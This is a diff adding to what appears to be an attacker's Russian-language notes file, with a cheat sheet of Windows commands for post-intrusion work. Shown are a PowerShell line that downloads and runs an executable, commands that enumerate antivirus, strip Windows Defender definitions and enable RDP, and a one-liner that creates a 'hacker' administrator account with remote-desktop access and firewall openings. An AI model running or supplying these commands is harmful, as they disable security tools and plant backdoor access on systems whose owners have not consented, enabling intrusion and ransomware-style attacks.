@@ -77,3 +77,54 @@ powershell.exe iwr [URL] -o C:\Users\Public\[NAME].exe; forfiles.exe /p c:\windo
 ````
 https://cloud.mail.ru/public/yp5y/tod8RWQqv
 ````
+````
+https://book.hacktricks.xyz/windows/basic-cmd-for-pentesters
+
+посмотреть процессы:
+
+tasklist /V
+tasklist /SVC
+
+посомтреть АВ\
+
+WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
+sc query windefend
+
+удалить правила для ДЕФ
+
+"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
+
+посмотреть установленные программы
+
+reg query HKEY_LOCAL_MACHINE\SOFTWARE
+
+ПОРТЫ открытые:
+
+netstat -ano
+
+порты для программ:
+netsh firewall show state
+netsh firewall show config
+
+
+включить РДП
+
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+netsh firewall add portopening TCP 3389 "Remote Desktop"
+::netsh firewall set service remotedesktop enable #I found that this line is not needed
+::sc config TermService start= auto #I found that this line is not needed
+::net start Termservice #I found that this line is not needed
+
+
+net user hacker PASS /add & net localgroup administrators hacker /add & net localgroup "Remote Desktop Users" hacker /add & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f & netsh firewall add portopening TCP 3389 "Remote Desktop" & netsh firewall set service remoteadmin enable
+
+Авто загрузка управление
+
+- https://www.thewindowsclub.com/manage-startup-items-windows-8
+
+- https://www.techsupportall.com/how-to-disable-startup-programs-in-windows-10/#method4
+
+-= https://community.spiceworks.com/topic/2140905-disabling-windows-startup-services-through-command-prompt
+
+++ https://github.com/Faustvii/StartupManager
+````
